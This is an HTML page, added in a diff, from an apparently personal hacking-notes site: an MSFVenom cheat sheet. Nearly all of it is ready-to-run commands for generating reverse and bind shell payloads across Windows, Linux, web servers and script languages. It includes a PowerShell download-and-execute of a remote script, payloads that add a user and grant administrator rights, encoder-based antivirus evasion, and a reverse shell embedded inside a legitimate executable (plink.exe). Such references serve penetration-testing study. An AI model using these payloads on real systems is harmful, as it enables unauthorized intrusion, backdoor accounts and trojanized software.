@@ -1,0 +1,260 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MSFVenom Cheatsheet &mdash; docs 0.1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=b86133f3" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=9edc463e" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=2709fde1"></script>
+      <script src="../../_static/doctools.js?v=fd6eb6e6"></script>
+      <script src="../../_static/sphinx_highlight.js?v=6ffebe34"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="TTY Shells" href="tty_shells.html" />
+    <link rel="prev" title="Reverse Shells Home Page" href="index.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            docs
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../coding/index.html">Coding Homepage</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../index.html">Hacking Home Page</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../SQL/index.html">SQLI Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../FWbypass/index.html">Hacking Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../enum/index.html">Enumeration Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../AD/index.html">Active Directory  Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../metasploit/index.html">Metasploit Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../BoF/index.html">BoF Home Page</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="index.html">Reverse Shells Home Page</a><ul class="current">
+<li class="toctree-l3 current"><a class="current reference internal" href="#">MSFVenom Cheatsheet</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#listing">Listing</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#common-params-when-creating-a-shellcode">Common params when creating a shellcode</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#windows">Windows</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#linux-payloads">Linux Payloads</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#web-based-payloads">Web Based Payloads</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#script-language-payloads">Script Language payloads</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="tty_shells.html">TTY Shells</a></li>
+<li class="toctree-l3"><a class="reference internal" href="reverse_shells.html">Creating reverse shells</a></li>
+<li class="toctree-l3"><a class="reference internal" href="RFI/php_RFI.html">PHP Remote File Inclusion</a></li>
+<li class="toctree-l3"><a class="reference internal" href="macros/index.html">macros</a></li>
+<li class="toctree-l3"><a class="reference internal" href="XXE-XEE-XMLExternalEntity.html">XML exploit</a></li>
+<li class="toctree-l3"><a class="reference internal" href="index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../PE/index.html">PE Homepage</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../pivot/index.html">Network Pivot Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../wireshark.html">Wireshark tips</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../PWdecrypt/index.html">Password Decryption Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../exploits/index.html">Exploits Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../github/index.html">Github Hacking Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../C2/index.html">C2 Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../notableKaliLocations/index.html">Notable Kali Locations Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../defense/index.html">Cyber Defense Home Page</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../IT/index.html">IT Homepage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../interview_questions/index.html">interview questions</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../walkthroughs/index.html">Walkthroughs Page</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../photoshop/index.html">Photoshop home Page</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">docs</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../index.html">Hacking Home Page</a></li>
+          <li class="breadcrumb-item"><a href="index.html">Reverse Shells Home Page</a></li>
+      <li class="breadcrumb-item active">MSFVenom Cheatsheet</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/hacking/shells/msfvenom.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="msfvenom-cheatsheet">
+<h1>MSFVenom Cheatsheet<a class="headerlink" href="#msfvenom-cheatsheet" title="Link to this heading"></a></h1>
+<section id="listing">
+<h2>Listing<a class="headerlink" href="#listing" title="Link to this heading"></a></h2>
+<p>Payload</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msvenom -l</span>
+</pre></div>
+</div>
+<p>Encoders</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -l encoders</span>
+</pre></div>
+</div>
+</section>
+<section id="common-params-when-creating-a-shellcode">
+<h2>Common params when creating a shellcode<a class="headerlink" href="#common-params-when-creating-a-shellcode" title="Link to this heading"></a></h2>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-b &quot;\x00\x0a\x0d&quot;</span>
+<span class="go">-f c</span>
+<span class="go">-e x86/shikata_ga_nai -i 5</span>
+<span class="go">EXITFUNC=thread</span>
+<span class="go">PrependSetuid=True #Use this to create a shellcode that will execute something with SUID</span>
+</pre></div>
+</div>
+</section>
+<section id="windows">
+<h2>Windows<a class="headerlink" href="#windows" title="Link to this heading"></a></h2>
+<p>Reverse Shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe &gt; reverse.exe</span>
+</pre></div>
+</div>
+<p>Bind Shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe &gt; bind.exe</span>
+</pre></div>
+</div>
+<p>Create User</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe &gt; adduser.exe</span>
+</pre></div>
+</div>
+<p>CMD Shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe &gt; prompt.exe</span>
+</pre></div>
+</div>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe &gt; prompt.exe</span>
+</pre></div>
+</div>
+<p>Execute Command</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -a x86 --platform Windows -p windows/exec CMD=&quot;powershell \&quot;IEX(New-Object Net.webClient).downloadString(&#39;http://IP/nishang.ps1&#39;)\&quot;&quot; -f exe &gt; pay.exe</span>
+<span class="go">msfvenom -a x86 --platform Windows -p windows/exec CMD=&quot;net localgroup administrators shaun /add&quot; -f exe &gt; pay.exe</span>
+</pre></div>
+</div>
+<p>Encoder</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe</span>
+</pre></div>
+</div>
+<p>Embedded inside executable</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe</span>
+</pre></div>
+</div>
+</section>
+<section id="linux-payloads">
+<h2>Linux Payloads<a class="headerlink" href="#linux-payloads" title="Link to this heading"></a></h2>
+<p>Reverse Shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p linux/x86//meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf &gt; reverse.elf</span>
+<span class="go">msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf &gt; shell.elf</span>
+</pre></div>
+</div>
+<p>Bind Shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf &gt; bind.elf</span>
+</pre></div>
+</div>
+</section>
+<section id="web-based-payloads">
+<h2>Web Based Payloads<a class="headerlink" href="#web-based-payloads" title="Link to this heading"></a></h2>
+<p>PHP - Reverse Shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php</span>
+<span class="go">cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span>
+</pre></div>
+</div>
+<p>ASP/x – Reverse Shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp &gt;reverse.asp</span>
+<span class="go">msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx &gt;reverse.aspx</span>
+</pre></div>
+</div>
+<p>JSP - Reverse shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw&gt; reverse.jsp</span>
+</pre></div>
+</div>
+<p>WAR - Reverse shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war &gt; reverse.war</span>
+</pre></div>
+</div>
+<p>NODEJS - Reverse Shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)</span>
+</pre></div>
+</div>
+</section>
+<section id="script-language-payloads">
+<h2>Script Language payloads<a class="headerlink" href="#script-language-payloads" title="Link to this heading"></a></h2>
+<p>Perl</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.pl</span>
+</pre></div>
+</div>
+<p>python</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw &gt; reverse.py</span>
+</pre></div>
+</div>
+<p>Bash</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.sh</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="index.html" class="btn btn-neutral float-left" title="Reverse Shells Home Page" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="tty_shells.html" class="btn btn-neutral float-right" title="TTY Shells" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025, mynameisORIG.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
